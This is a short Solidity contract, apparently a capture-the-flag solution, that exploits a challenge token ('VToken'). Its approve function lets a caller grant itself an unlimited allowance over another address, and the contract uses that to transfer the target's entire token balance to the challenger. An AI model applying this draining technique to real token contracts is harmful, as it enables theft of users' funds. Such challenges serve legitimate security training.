// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.14;
import "../Challenge0.VToken.sol";

contract Exploit0 {
    address target_s;
    address token_s;
    address challenger_s;

    constructor(address target, address tokenAddr, address challenger) {
        target_s = target;
        token_s = tokenAddr;
        challenger_s = challenger;
    }

    function exploit() external {
        // We need to do the approval first. An allowance of infinite, why not?
        uint256 amount = 2**256 - 1; // We set the amount to MAX_INT.
        bool success = VToken(token_s).approve(target_s, address(this), amount);
        require(success, "Approve failed");

        // Now we transfer all the current tokens to the account.
        amount = VToken(token_s).balanceOf(target_s);
        success = VToken(token_s).transferFrom(target_s, challenger_s, amount);
        require(success, "Transfer of tokens failed.");
    }
}